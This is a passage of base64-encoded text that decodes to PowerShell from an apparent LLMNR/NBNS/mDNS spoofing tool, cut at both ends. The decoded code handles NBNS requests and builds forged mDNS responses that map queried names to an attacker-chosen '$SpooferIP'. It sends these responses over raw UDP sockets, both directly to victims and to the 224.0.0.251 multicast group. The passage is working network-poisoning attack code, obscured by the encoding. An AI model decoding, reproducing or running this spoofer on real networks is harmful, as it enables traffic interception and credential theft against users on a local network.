AgICAgICAgICAgICAgICAkTkJOU19yZXNwb25zZV9tZXNzYWdlID0gIi0gbG9jYWwgcmVxdWVzdCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICROQk5TX3Jlc3BvbnNlX21lc3NhZ2UgPSAiLSBzb21ldGhpbmcgd2VudCB3cm9uZyIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCEkTkJOU19yZXF1ZXN0X2lnbm9yZSAtYW5kIFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJHBheWxvYWRfYnl0ZXNbNC4uN10pIC1lcSAnMDAtMDEtMDAtMDAnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIE5CTlMgcmVxdWVzdCBmb3IgJE5CTlNfcXVlcnlfc3RyaW5nPCROQk5TX3F1ZXJ5X3R5cGU+IHJlY2VpdmVkIGZyb20gJHNvdXJjZV9JUCAkTkJOU19yZXNwb25zZV9tZXNzYWdlIikKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gTkJOUyByZXF1ZXN0IGZvciAkTkJOU19xdWVyeV9zdHJpbmc8JE5CTlNfcXVlcnlfdHlwZT4gcmVjZWl2ZWQgZnJvbSAkc291cmNlX0lQICROQk5TX3Jlc3BvbnNlX21lc3NhZ2UiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2gubG9nX291dHB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gTkJOUyByZXF1ZXN0IGZvciAkTkJOU19xdWVyeV9zdHJpbmc8JE5CTlNfcXVlcnlfdHlwZT4gcmVjZWl2ZWQgZnJvbSAkc291cmNlX0lQICROQk5TX3Jlc3BvbnNlX21lc3NhZ2UiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYoJFNwb29mZXJMZWFybmluZyAtZXEgJ1knIC1hbmQgW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkcGF5bG9hZF9ieXRlc1s0Li43XSkgLWVxICcwMC0wMC0wMC0wMScgLWFuZCAkTkJOU19sZWFybmluZ19sb2cuRXhpc3RzKHtwYXJhbSgkcykgJHMgLWxpa2UgIiogIiArIFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJHBheWxvYWRfYnl0ZXNbMC4uMV0pICsgIiAqIn0pKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFtCeXRlW11dJE5CTlNfcmVzcG9uc2VfSVBfYnl0ZXMgPSAkcGF5bG9hZF9ieXRlc1soJHBheWxvYWRfYnl0ZXMuTGVuZ3RoIC0gNCkuLigkcGF5bG9hZF9ieXRlcy5MZW5ndGgpXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICROQk5TX3Jlc3BvbnNlX0lQID0gW1N5c3RlbS5OZXQuSVBBZGRyZXNzXSROQk5TX3Jlc3BvbnNlX0lQX2J5dGVzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5CTlNfcmVzcG9uc2VfSVAgPSAkTkJOU19yZXNwb25zZV9JUC5JUEFkZHJlc3NUb1N0cmluZwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC52YWxpZF9ob3N0X2xpc3QgLW5vdGNvbnRhaW5zICROQk5TX3F1ZXJ5X3N0cmluZykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLnZhbGlkX2hvc3RfbGlzdC5BZGQoJE5CTlNfcXVlcnlfc3RyaW5nKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBOQk5TIHJlc3BvbnNlICROQk5TX3Jlc3BvbnNlX0lQIGZvciAkTkJOU19xdWVyeV9zdHJpbmcgcmVjZWl2ZWQgZnJvbSAkc291cmNlX0lQIC0gJE5CTlNfcXVlcnlfc3RyaW5nIGFkZGVkIHRvIHZhbGlkIGhvc3QgbGlzdCIpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5maWxlX291dHB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIE5CTlMgcmVzcG9uc2UgJE5CTlNfcmVzcG9uc2VfSVAgZm9yICROQk5TX3F1ZXJ5X3N0cmluZyByZWNlaXZlZCBmcm9tICRzb3VyY2VfSVAgLSAkTkJOU19xdWVyeV9zdHJpbmcgYWRkZWQgdG8gdmFsaWQgaG9zdCBsaXN0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2gubG9nX291dHB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBOQk5TIHJlc3BvbnNlICROQk5TX3Jlc3BvbnNlX0lQIGZvciAkTkJOU19xdWVyeV9zdHJpbmcgcmVjZWl2ZWQgZnJvbSAkc291cmNlX0lQIC0gJE5CTlNfcXVlcnlfc3RyaW5nIGFkZGVkIHRvIHZhbGlkIGhvc3QgbGlzdCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICA1MzUzICMgbUROUwogICAgICAgICAgICAgICAgICAgIHsgICAKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJHBheWxvYWRfYnl0ZXMpIC1saWtlICcqLTAwLTAxLTgwLTAxJykKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVEUF9sZW5ndGhbMF0gKz0gMTAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtRE5TX3F1ZXJ5X3BheWxvYWRfYnl0ZXMgPSAkcGF5bG9hZF9ieXRlc1soMTIpLi4oJHBheWxvYWRfYnl0ZXMuTGVuZ3RoIC0gNSldCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbUROU19xdWVyeV9zdHJpbmcgPSBEYXRhVG9TdHJpbmcgMSAkbUROU19xdWVyeV9wYXlsb2FkX2J5dGVzWzBdICRtRE5TX3F1ZXJ5X3BheWxvYWRfYnl0ZXMKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtRE5TX3F1ZXJ5X3N0cmluZ19mdWxsID0gJG1ETlNfcXVlcnlfc3RyaW5nICsgIi5sb2NhbCIKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbUROU19yZXNwb25zZV9kYXRhID0gJG1ETlNfcXVlcnlfcGF5bG9hZF9ieXRlcyArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDEsMHgwMCwweDAxICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtRE5TX1RUTF9ieXRlcyArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDQgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKFtTeXN0ZW0uTmV0LklQQWRkcmVzc11bU3RyaW5nXShbU3lzdGVtLk5ldC5JUEFkZHJlc3NdJFNwb29mZXJJUCkpLkdldEFkZHJlc3NCeXRlcygpCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1ETlNfcmVzcG9uc2VfcGFja2V0ID0gMHgxNCwweGU5ICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzb3VyY2VfcG9ydFsxLDBdICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRVRFBfbGVuZ3RoWzEsMF0gKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYXlsb2FkX2J5dGVzWzAsMV0gKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg4NCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDEsMHgwMCwweDAwLDB4MDAsMHgwMCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbUROU19yZXNwb25zZV9kYXRhCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRtRE5TIC1lcSAnWScpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCghJFNwb29mZXJIb3N0c1JlcGx5IC1vciAkU3Bvb2Zlckhvc3RzUmVwbHkgLWNvbnRhaW5zICRtRE5TX3F1ZXJ5X3N0cmluZykgLWFuZCAoISRTcG9vZmVySG9zdHNJZ25vcmUgLW9yICRTcG9vZmVySG9zdHNJZ25vcmUgLW5vdGNvbnRhaW5zICRtRE5TX3F1ZXJ5X3N0cmluZykgLWFuZCAoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgISRTcG9vZmVySVBzUmVwbHkgLW9yICRTcG9vZmVySVBzUmVwbHkgLWNvbnRhaW5zICRzb3VyY2VfSVApIC1hbmQgKCEkU3Bvb2ZlcklQc0lnbm9yZSAtb3IgJFNwb29mZXJJUHNJZ25vcmUgLW5vdGNvbnRhaW5zICRzb3VyY2VfSVApIC1hbmQgKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLnNwb29mZXJfcmVwZWF0IC1vciAkaW52ZWlnaC5JUF9jYXB0dXJlX2xpc3QgLW5vdGNvbnRhaW5zICRzb3VyY2VfSVAuSVBBZGRyZXNzVG9TdHJpbmcpIC1hbmQgKCRtRE5TVHlwZXMgLWNvbnRhaW5zICdRVScpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHNlbmRfc29ja2V0ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuU29ja2V0KFtTeXN0ZW0uTmV0LlNvY2tldHMuQWRkcmVzc0ZhbWlseV06OkludGVyTmV0d29yayxbU3lzdGVtLk5ldC5Tb2NrZXRzLlNvY2tldFR5cGVdOjpSYXcsW1N5c3RlbS5OZXQuU29ja2V0cy5Qcm90b2NvbFR5cGVdOjpVZHAgKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc2VuZF9zb2NrZXQuU2VuZEJ1ZmZlclNpemUgPSAxMDI0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRkZXN0aW5hdGlvbl9wb2ludCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5JUEVuZHBvaW50KCRzb3VyY2VfSVAsJGVuZHBvaW50X3NvdXJjZV9wb3J0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc2VuZF9zb2NrZXQuU2VuZFRvKCRtRE5TX3Jlc3BvbnNlX3BhY2tldCwkZGVzdGluYXRpb25fcG9pbnQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzZW5kX3NvY2tldC5DbG9zZSgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtRE5TX3Jlc3BvbnNlX21lc3NhZ2UgPSAiLSByZXNwb25zZSBzZW50IgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJG1ETlNUeXBlcyAtbm90Y29udGFpbnMgJ1FVJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1ETlNfcmVzcG9uc2VfbWVzc2FnZSA9ICItIGRpc2FibGVkIG1ETlMgdHlwZSIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYoJFNwb29mZXJIb3N0c1JlcGx5IC1hbmQgJFNwb29mZXJIb3N0c1JlcGx5IC1ub3Rjb250YWlucyAkbUROU19xdWVyeV9zdHJpbmcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtRE5TX3Jlc3BvbnNlX21lc3NhZ2UgPSAiLSAkbUROU19xdWVyeV9zdHJpbmcgaXMgbm90IG9uIHJlcGx5IGxpc3QiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZWlmKCRTcG9vZmVySG9zdHNJZ25vcmUgLWFuZCAkU3Bvb2Zlckhvc3RzSWdub3JlIC1jb250YWlucyAkbUROU19xdWVyeV9zdHJpbmcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtRE5TX3Jlc3BvbnNlX21lc3NhZ2UgPSAiLSAkbUROU19xdWVyeV9zdHJpbmcgaXMgb24gaWdub3JlIGxpc3QiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZWlmKCRTcG9vZmVySVBzUmVwbHkgLWFuZCAkU3Bvb2ZlcklQc1JlcGx5IC1ub3Rjb250YWlucyAkc291cmNlX0lQKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbUROU19yZXNwb25zZV9tZXNzYWdlID0gIi0gJHNvdXJjZV9JUCBpcyBub3Qgb24gcmVwbHkgbGlzdCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYoJFNwb29mZXJJUHNJZ25vcmUgLWFuZCAkU3Bvb2ZlcklQc0lnbm9yZSAtY29udGFpbnMgJHNvdXJjZV9JUCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1ETlNfcmVzcG9uc2VfbWVzc2FnZSA9ICItICRzb3VyY2VfSVAgaXMgb24gaWdub3JlIGxpc3QiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbUROU19yZXNwb25zZV9tZXNzYWdlID0gIi0gbm90IHNwb29mZWQgZHVlIHRvIHByZXZpb3VzIGNhcHR1cmUiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBtRE5TKFFVKSByZXF1ZXN0IGZvciAkbUROU19xdWVyeV9zdHJpbmdfZnVsbCByZWNlaXZlZCBmcm9tICRzb3VyY2VfSVAgJG1ETlNfcmVzcG9uc2VfbWVzc2FnZSIpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIG1ETlMoUVUpIHJlcXVlc3QgZm9yICRtRE5TX3F1ZXJ5X3N0cmluZ19mdWxsIHJlY2VpdmVkIGZyb20gJHNvdXJjZV9JUCAkbUROU19yZXNwb25zZV9tZXNzYWdlIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5sb2dfb3V0cHV0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gbUROUyhRVSkgcmVxdWVzdCBmb3IgJG1ETlNfcXVlcnlfc3RyaW5nX2Z1bGwgcmVjZWl2ZWQgZnJvbSAkc291cmNlX0lQICRtRE5TX3Jlc3BvbnNlX21lc3NhZ2UiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkcGF5bG9hZF9ieXRlcykgLWxpa2UgJyotMDUtNkMtNkYtNjMtNjEtNkMtMDAtMDAtMDEtMDAtMDEtKicpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRVRFBfbGVuZ3RoWzBdICs9IDQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtRE5TX3F1ZXJ5X3BheWxvYWRfYnl0ZXMgPSAkcGF5bG9hZF9ieXRlc1sxMi4uKCRwYXlsb2FkX2J5dGVzWzEyXSArIDEyKV0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtRE5TX3F1ZXJ5X3N0cmluZyA9IERhdGFUb1N0cmluZyAxICRtRE5TX3F1ZXJ5X3BheWxvYWRfYnl0ZXNbMF0gJG1ETlNfcXVlcnlfcGF5bG9hZF9ieXRlcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1ETlNfcXVlcnlfc3RyaW5nX2Z1bGwgPSAkbUROU19xdWVyeV9zdHJpbmcgKyAiLmxvY2FsIgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtRE5TX3Jlc3BvbnNlX2RhdGEgPSAkbUROU19xdWVyeV9wYXlsb2FkX2J5dGVzICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDUsMHg2YywweDZmLDB4NjMsMHg2MSwweDZjLDB4MDAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAxLDB4ODAsMHgwMSArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbUROU19UVExfYnl0ZXMgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDA0ICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIChbU3lzdGVtLk5ldC5JUEFkZHJlc3NdW1N0cmluZ10oW1N5c3RlbS5OZXQuSVBBZGRyZXNzXSRTcG9vZmVySVApKS5HZXRBZGRyZXNzQnl0ZXMoKQoKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbUROU19yZXNwb25zZV9wYWNrZXQgPSAweDE0LDB4ZTkgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHNvdXJjZV9wb3J0WzEsMF0gKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVEUF9sZW5ndGhbMSwwXSArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBheWxvYWRfYnl0ZXNbMCwxXSArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDg0LDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMSwweDAwLDB4MDAsMHgwMCwweDAwICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtRE5TX3Jlc3BvbnNlX2RhdGEKICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJG1ETlMgLWVxICdZJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoKCEkU3Bvb2Zlckhvc3RzUmVwbHkgLW9yICRTcG9vZmVySG9zdHNSZXBseSAtY29udGFpbnMgJG1ETlNfcXVlcnlfc3RyaW5nKSAtYW5kICghJFNwb29mZXJIb3N0c0lnbm9yZSAtb3IgJFNwb29mZXJIb3N0c0lnbm9yZSAtbm90Y29udGFpbnMgJG1ETlNfcXVlcnlfc3RyaW5nKSAtYW5kICgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAhJFNwb29mZXJJUHNSZXBseSAtb3IgJFNwb29mZXJJUHNSZXBseSAtY29udGFpbnMgJHNvdXJjZV9JUCkgLWFuZCAoISRTcG9vZmVySVBzSWdub3JlIC1vciAkU3Bvb2ZlcklQc0lnbm9yZSAtbm90Y29udGFpbnMgJHNvdXJjZV9JUCkgLWFuZCAoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guc3Bvb2Zlcl9yZXBlYXQgLW9yICRpbnZlaWdoLklQX2NhcHR1cmVfbGlzdCAtbm90Y29udGFpbnMgJHNvdXJjZV9JUC5JUEFkZHJlc3NUb1N0cmluZykgLWFuZCAoJG1ETlNUeXBlcyAtY29udGFpbnMgJ1FNJykpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc2VuZF9zb2NrZXQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5Tb2NrZXQoW1N5c3RlbS5OZXQuU29ja2V0cy5BZGRyZXNzRmFtaWx5XTo6SW50ZXJOZXR3b3JrLFtTeXN0ZW0uTmV0LlNvY2tldHMuU29ja2V0VHlwZV06OlJhdyxbU3lzdGVtLk5ldC5Tb2NrZXRzLlByb3RvY29sVHlwZV06OlVkcCApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzZW5kX3NvY2tldC5TZW5kQnVmZmVyU2l6ZSA9IDEwMjQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGRlc3RpbmF0aW9uX3BvaW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LklQRW5kcG9pbnQoW0lQQWRkcmVzc10iMjI0LjAuMC4yNTEiLDUzNTMpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzZW5kX3NvY2tldC5TZW5kVG8oJG1ETlNfcmVzcG9uc2VfcGFja2V0LCRkZXN0aW5hdGlvbl9wb2ludCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHNlbmRfc29ja2V0LkNsb3NlKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1ETlNfcmVzcG9uc2VfbWVzc2FnZSA9ICItIHJlc3BvbnNlIHNlbnQiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkbUROU1R5cGVzIC1ub3Rjb250YWlucyAnUU0nKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbUROU19yZXNwb25zZV9tZXNzYWdlID0gIi0gZGlzYWJsZWQgbUROUyB0eXBlIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2VpZigkU3Bvb2Zlckhvc3RzUmVwbHkgLWFuZCAkU3Bvb2Zlckhvc3RzUmVwbHkgLW5vdGNvbnRhaW5zICRtRE5TX3F1ZXJ5X3N0cmluZykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1ETlNfcmVzcG9uc2VfbWVzc2FnZSA9ICItICRtRE5TX3F1ZXJ5X3N0cmluZyBpcyBub3Qgb24gcmVwbHkgbGlzdCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYoJFNwb29mZXJIb3N0c0lnbm9yZSAtYW5kICRTcG9vZmVySG9zdHNJZ25vcmUgLWNvbnRhaW5zICRtRE5TX3F1ZXJ5X3N0cmluZykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1ETlNfcmVzcG9uc2VfbWVzc2FnZSA9ICItICRtRE5TX3F1ZXJ5X3N0cmluZyBpcyBvbiBpZ25vcmUgbGlzdCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYoJFNwb29mZXJJUHNSZXBseSAtYW5kICRTcG9vZmVySVBzUmVwbHkgLW5vdGNvbnRhaW5zICRzb3VyY2VfSVApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtRE5TX3Jlc3BvbnNlX21lc3NhZ2UgPSAiLSAkc291cmNlX0lQIGlzIG5vdCBvbiByZXBseSBsaXN0IgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2VpZigkU3Bvb2ZlcklQc0lnbm9yZSAtYW5kICRTcG9vZmVySVBzSWdub3JlIC1jb250YWlucyAkc291cmNlX0lQKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC